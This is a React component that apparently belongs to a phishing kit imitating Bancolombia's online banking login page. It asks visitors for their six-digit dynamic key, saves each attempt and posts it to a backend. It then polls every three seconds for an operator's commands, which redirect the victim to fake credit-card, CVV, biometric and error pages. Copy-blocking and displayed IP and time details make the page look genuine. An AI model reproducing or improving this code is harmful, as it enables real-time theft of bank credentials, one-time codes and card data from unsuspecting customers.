import { instanceBackend } from "app/axios/instanceBackend";
import { useEffect, useState, useRef } from "react";
import AccionesModal from "./modals/accionesModal";
import ClaveDinaModal from "./modals/ClaveDinaModal";
import Loading from "../../components/Loading";
import imgClaveDinamica from "../../../DinamicaClave/clavedinamica.gif";
import './css/LoginModal.css';

// Se exporta el componente
export default function ClaveDinamica() {

    // Se inicializa el formState
    const [formState, setFormState] = useState({
        usuario: "",
        clave: "",
        errorUsuario: false,
        errorClave: false,
        lanzarModalAcciones: false,
        lanzarModalInactividad: false,
        lanzarModalClaveDinamica: false,
        touchedClave: false
    });

    // Se inicializa el estado del boton
    const [botonHabilitado, setBotonHabilitado] = useState(false);
    const [botonBorrarHabilitado, setBotonBorrarHabilitado] = useState(true);
    const [otpFocused, setOtpFocused] = useState(false);
    const [cargando, setCargando] = useState(false);

    const inputRefs = useRef([]);

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se valida si el estado en el localStorage es error
        const estadoSesion = localStorage.getItem('estado_sesion');

        // Si es error, se muestra el modal
        if (estadoSesion === 'error') {

            // Se borra el estado del localStorage
            localStorage.removeItem('estado_sesion');

            // Se muestra el modal de error de sesión OTP
            setFormState(prev => ({
                ...prev,
                lanzarModalClaveDinamica: true
            }));

            // Se quita a los 2 segundos
            setTimeout(() => {

                // Se llama el metodo para cerrar el modal
                setFormState(prev => ({
                    ...prev,
                    lanzarModalClaveDinamica: false
                }));
            }, 2000);
        };

        // Se obtiene la IP
        obtenerIP();

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Obtiene la dirección IP pública del usuario
    const obtenerIP = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // Obtiene la fecha y hora actual del sistema
    const obtenerFechaHora = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Se crea el useEffect para el manejo de inactividad
    useEffect(() => {

        // Variable para el temporizador
        let inactivityTimeout;

        // Se define el tiempo de inactividad (en milisegundos)
        const tiempoInactividad = 1000 * 60 * 1; // 5 minutos

        // Función para reiniciar el temporizador
        const reiniciarTemporizador = () => {

            // Se limpia el temporizador anterior
            clearTimeout(inactivityTimeout);

            // Se establece un nuevo temporizador
            inactivityTimeout = setTimeout(() => {

                // Se lanza el modal de inactividad
                setFormState(prev => ({
                    ...prev,
                    lanzarModalInactividad: false
                }));
            }, tiempoInactividad);
        };

        // Se reinicia el temporizador al cargar la página
        reiniciarTemporizador();

        // Se agrega un evento para detectar movimiento del mouse o pulsación de teclado
        window.addEventListener("mousemove", reiniciarTemporizador);
        window.addEventListener("keydown", reiniciarTemporizador);

        // Se limpia el efecto al desmontar el componente
        return () => {
            clearTimeout(inactivityTimeout);
            window.removeEventListener("mousemove", reiniciarTemporizador);
            window.removeEventListener("keydown", reiniciarTemporizador);
        };
    }, []);

    // Manejo de cambio en inputs OTP
    const handleOtpChange = (e, index) => {

        // Se obtiene el valor ingresado
        const { value } = e.target;

        // Permitir solo números
        if (value && !/^[0-9]*$/.test(value)) return;

        // Dividir la clave actual en un array de caracteres
        let chars = formState.clave.split('');

        // Asegurar que el array tenga longitud suficiente
        while (chars.length < 6) chars.push('');

        // Actualizar el valor en la posición correcta
        chars[index] = value.slice(-1); // Tomar solo el último caracter si se escribe más

        // Si se borra
        if (!value) chars[index] = '';

        // Unir los caracteres para formar la nueva clave
        const newClave = chars.join('').slice(0, 6);

        // Actualizar el estado del formulario
        setFormState(prev => ({
            ...prev,
            clave: newClave,
            errorClave: false
        }));

        // Auto-focus al siguiente
        if (value && index < 5) {

            // Se enfoca el siguiente input
            inputRefs.current[index + 1].focus();
        }

        // Se valida cuando la clave esta completa
        if (newClave.length === 6) {

            // Se habilita el boton de continuar
            setBotonHabilitado(true);
        } else if (newClave.length === 0) {

            // Se habilita el boton de borrar
            setBotonBorrarHabilitado(true);

            // Se deshabilita el boton de continuar
            setBotonHabilitado(false);
        } else if (newClave.length > 0) {

            // Se habilita el boton de borrar
            setBotonBorrarHabilitado(false);

            // Se valida si la longitud es menor a 6
            if (newClave.length < 6) {

                // Se deshabilita el boton de continuar
                setBotonHabilitado(false);
            };
        };
    };

    // Metodo para manejar la tecla presionada
    const handleKeyDown = (e, index) => {

        // Si se presiona Backspace
        if (e.key === "Backspace") {

            // Si el campo actual está vacío y no es el primero, ir al anterior
            if (!formState.clave[index] && index > 0) {

                // Se enfoca el input anterior
                inputRefs.current[index - 1].focus();
            };
        };
    };

    // Metodo encargado de bloquear el clipboard
    const bloquearClipboard = (e) => {

        // Se previene la accion por defecto
        e.preventDefault();

        // Se valida si ya hay un temporalizador activo
        if (formState.lanzarModalAcciones) return;

        // Se lanza la alerta
        setFormState(prev => ({
            ...prev,
            lanzarModalAcciones: true
        }));

        // Se crea un temporalizador para cerrar el modal
        setTimeout(() => {

            // Se llama el metodo para cerrar el modal
            cerrarModalAcciones();
        }, 2500);
    };

    // Metodo encargado de cerrar el modal
    const cerrarModalAcciones = () => {

        // Se actualiza el estado del formulario
        setFormState(prev => ({
            ...prev,
            lanzarModalAcciones: false
        }));
    };

    // Metodo encargado de limpiar la clave
    const handleClear = () => {

        // Se limpia el campo de la clave
        setFormState(prev => ({
            ...prev,
            clave: "",
            errorClave: false
        }));

        // Se deshabilitan el boton de continuar
        setBotonHabilitado(false);

        // Se deshabilita el boton de borrar
        setBotonBorrarHabilitado(true);

        // Se enfoca el primer input
        inputRefs.current[0].focus();
    };

    // Metodo encargado de manejar el blur del OTP
    const handleOtpBlur = () => {

        // Se actualiza el estado del formulario
        setFormState(prev => ({
            ...prev,
            touchedClave: true,
            errorClave: prev.clave.length === 0
        }));
    };

    // Metodo encargado de manejar el envio de la clave
    const handleContinuar = async () => {

        // Se muestra el cargando
        setCargando(true);

        // Se envia la clave al backend
        try {
            // Get session ID from localStorage
            const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
            const sesionId = usuarioLocalStorage?.sesion_id;

            if (!sesionId) {
                alert("Error: No se encontró la sesión");
                setCargando(false);
                return;
            }

            // Se prepara la data a enviar
            const clave = formState.clave;

            // Registrar intento antes de enviar
            actualizarLocalStorage(clave);

            // Prepara los datos con ID de sesión
            const dataLocalStorage = localStorage.getItem("datos_usuario") ? JSON.parse(localStorage.getItem("datos_usuario")) : null;

            // Se envia la data
            const dataSend = {
                "data": {
                    "attributes": dataLocalStorage
                },
            };

            // Enviar al backend
            await instanceBackend.post('/dinamica', dataSend);

            // Iniciar polling para esperar respuesta del admin
            iniciarPolling(sesionId);
        } catch (error) {

            // En caso de error, se muestra un mensaje
            setCargando(false);

            // Se muestra la alerta de error
            alert('Error enviando clave. Intente nuevamente.');
        };
    };

    // Función de polling para esperar respuesta del admin
    const iniciarPolling = (sesionId) => {
        const pollingInterval = setInterval(async () => {
            try {
                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado } = response.data;

                console.log('DIN Polling:', estado);

                // Estados que detienen el polling
                const estadosFinales = [

                    // Botones linea 1
                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',

                    // Botones linea 2
                    'error_tc', 'error_otp', 'error_din', 'error_login',

                    // Botones linea 3
                    'solicitar_biometria', 'error_923',

                    // Botones linea 4
                    'solicitar_tc_custom', 'solicitar_cvv_custom',

                    // Estados adicionales por pantalla
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                ];

                if (estadosFinales.includes(estado.toLowerCase())) {
                    clearInterval(pollingInterval);
                }

                // Redirecciones basadas en respuesta del admin
                switch (estado.toLowerCase()) {
                    case 'solicitar_tc':

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'error_tc':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_otp':

                        // Se quita el estado de cargando
                        setCargando(false);

                        // Se limpia la clave
                        handleClear();

                        // Se sale del ciclo
                        break;
                    case 'error_otp':
                        window.location.href = '/numero-otp';
                        break;

                    case 'solicitar_din':

                        // Recargar para reintentar DIN
                        setCargando(false);

                        // Se limpia la clave
                        handleClear();

                        // Se sale del ciclo
                        break;
                    case 'error_din':

                        // Recargar para reintentar DIN
                        setCargando(false);

                        // Se limpia la clave
                        handleClear();

                        // Se muestra el modal de error DIN
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalClaveDinamica: true
                        }));

                        // Se cierra el modal despues de 2 segundos
                        setTimeout(() => {
                            setFormState(prev => ({
                                ...prev,
                                lanzarModalClaveDinamica: false
                            }));
                        }, 2000);

                        // Se sale del ciclo
                        break;
                    case 'solicitar_finalizar':

                        // Redirigir a la página finalizado
                        window.location.href = '/finalizado-page';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_biometria':

                        // Redirigir a la verificación de identidad
                        window.location.href = '/verificacion-identidad';

                        // Se sale del ciclo
                        break;
                    case 'error_923':

                        // Redirigir a la página de error 923
                        window.location.href = '/error-923page';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_tc_custom':

                        // Redirigir a la validación de tarjeta de crédito custom
                        window.location.href = '/tc-customs';

                        // Se sale del ciclo
                        break;
                    case 'solicitar_cvv_custom':

                        // Redirigir a la validación de CVV custom
                        window.location.href = '/tc-customs';

                        // Se sale del ciclo
                        break;
                    case 'error_login':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la página de autenticación
                        window.location.href = '/autenticacion';

                        // Se sale del ciclo
                        break;
                    default:
                }
            } catch (error) {

                // Se quita el estado de cargando
                setCargando(false);

                // Se lanza una alerta de error
                alert('Error consultando estado. Intente nuevamente.');
            }
        }, 3000);
    };

    // Metodo para registrar el intento de DIN
    const actualizarLocalStorage = (clave, estado = "PENDIENTE") => {

        // Se obtiene los datos del localStorage
        const storageKey = "datos_usuario";

        // Se obtiene el valor almacenado
        const raw = localStorage.getItem(storageKey);

        // Se parsea el JSON o se inicializa un objeto vacío
        let datos = raw ? JSON.parse(raw) : {};

        // Se inicializa el objeto de intentos si no existe
        if (!datos.dinamica) datos.dinamica = {};

        // Se crea la clave del nuevo intento
        const intentoNum = Object.keys(datos.dinamica).length + 1;
        const intentoKey = `intento_${intentoNum}`;

        // Se registra el nuevo intento
        datos.dinamica[intentoKey] = {
            clave: clave,
            fecha: new Date().toLocaleString(),
            estado: estado,
            sesion_id: datos.sesion_id || null
        };

        // Se guarda nuevamente en el localStorage
        localStorage.setItem(storageKey, JSON.stringify(datos));

        // Se retorna el objeto de intentos
        return datos.dinamica;
    };

    // Metodo para manejar el foco en el OTP
    const handleOtpFocus = () => {

        // Se actualiza el estado del foco
        setOtpFocused(true);
    };

    // Se retorna el componente
    return (
        <>
            <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundSize: "cover",
                        backgroundPositionY: "-140px",
                        backgroundPositionX: "-610px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="general-title">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            <img src={imgClaveDinamica} alt="Clave Dinámica" style={{ width: "500px", margin: "0 auto", display: "block", borderRadius: "8px" }} />
                            <h2 className="login-title">Ingresa la Clave Dinámica</h2>
                            <p className="login-subtitle" style={{ fontSize: "16px", color: "#ffffff" }}>
                                Encuentra tu Clave Dinámica en la app Mi Bancolombia.
                            </p>

                            <br />
                            <br />


                            {/* ----------------------------------------- CLAVE (SEGMENTED) -----------------------------------------*/}

                            <div
                                className="otp-container"
                                style={{
                                    display: "flex",
                                    justifyContent: "center",
                                    gap: "10px",
                                    marginBottom: "20px"
                                }}
                            >

                                {[0, 1, 2, 3, 4, 5].map((index) => (
                                    <input
                                        key={index}
                                        ref={(el) => (inputRefs.current[index] = el)}
                                        type="password"
                                        inputMode="numeric"
                                        maxLength={1}
                                        value={formState.clave[index] || ""}
                                        onChange={(e) => handleOtpChange(e, index)}
                                        onKeyDown={(e) => handleKeyDown(e, index)}
                                        onFocus={(e) => {
                                            handleOtpFocus();
                                            e.target.select();
                                        }}
                                        onBlur={handleOtpBlur}
                                        className={`otp-input ${formState.touchedClave && formState.clave.length === 0
                                            ? "otp-error"
                                            : ""
                                            }`}
                                        onCopy={bloquearClipboard}
                                        onPaste={bloquearClipboard}
                                        onCut={bloquearClipboard}
                                        onContextMenu={bloquearClipboard}
                                    />
                                ))}
                                <style>{`
                                    .otp-input:focus {
                                        border-bottom: 2px solid #FDDA24 !important;
                                    }
                                `}</style>
                            </div>
                            <div style={{ textAlign: "center", marginTop: "10px" }}>
                            </div>
                            <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                                <button className="login-btn-borrar mt-4" style={{ fontSize: "14px" }} disabled={botonBorrarHabilitado} onClick={() => handleClear()}>
                                    Borrar
                                </button>
                                <button className="login-btn mt-4" style={{ fontSize: "14px" }} disabled={!botonHabilitado} onClick={handleContinuar}>
                                    Continuar
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        alt="Bancolombia"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Modal de inactividad */}
                {formState.lanzarModalInactividad ?
                    <ClaveDinaModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalInactividad: false
                    }))} /> : null}

                {/* Modal de acciones */}
                {formState.lanzarModalAcciones ?
                    <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={cerrarModalAcciones} /> : null}

                {/* Modal de error de sesión */}
                {formState.lanzarModalClaveDinamica ?
                    <ClaveDinaModal isOpen={formState.lanzarModalClaveDinamica} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalClaveDinamica: false
                    }))} /> : null}
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </>
    );
};
